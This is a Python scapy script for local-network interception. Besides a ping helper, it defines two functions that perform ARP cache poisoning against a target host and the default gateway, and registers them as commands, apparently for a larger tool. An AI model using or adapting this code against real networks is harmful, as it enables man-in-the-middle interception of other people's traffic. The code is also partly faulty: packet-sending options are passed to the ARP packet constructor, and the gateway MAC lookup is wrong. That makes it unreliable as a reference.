from scapy.all import *
import netifaces as ni

# code for getting local ip address found at:
# http://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
ni.ifaddresses('en0')
addresses = ni.ifaddresses('en0')
local_ip = addresses[2][0]['addr']
local_mac = addresses[18][0]['addr']

def ping(ip, mac):
    packet = IP(src=local_ip, dst=ip)/ICMP()
    send(packet)
    print("Sent ping to: %s!" % ip)

def arpcachepoison(ip, mac):
    # found details on the 'op' param found at:
    # http://stackoverflow.com/questions/32804176/python-scapy-arp-request-and-response

    # arp_request = ARP(op=ARP.who_has, psrc=local_ip, pdst=ip) # request ip to local_ip
    # response = sr(arp_request)

    gateways = ni.gateways()
    gateway_ip = gateways['default'][2][0]
    gateway_mac = gateways['default'][30][0]

    target = ARP(op=ARP.is_at, psrc=gateway_ip, pdst=ip, hwdst=gateway_mac, inter=RandNum(2, 5), loop=15)

    gateway = ARP(op=ARP.is_at, psrc=ip, pdst=gateway_ip, hwdst=gateway_mac, inter=RandNum(2, 5), loop=15)

    send(target)
    send(gateway)

def poison_gateway(ip, mac):
    gateways = ni.gateways()
    gateway_ip = gateways['default'][2][0]
    gateway_mac = gateways['default'][30][0]

    # as seen at http://phaethon.github.io/scapy/api/usage.html?highlight=sniff#arp-cache-poisoning
    sendp( Ether(dst=mac)/ARP(op=ARP.is_at, psrc=gateway_ip, pdst=ip),
      inter=RandNum(1, 5), loop=15 )

registered = {
    'ping': ping,
    'arpcachepoison': arpcachepoison,
    'poison_gateway': poison_gateway
}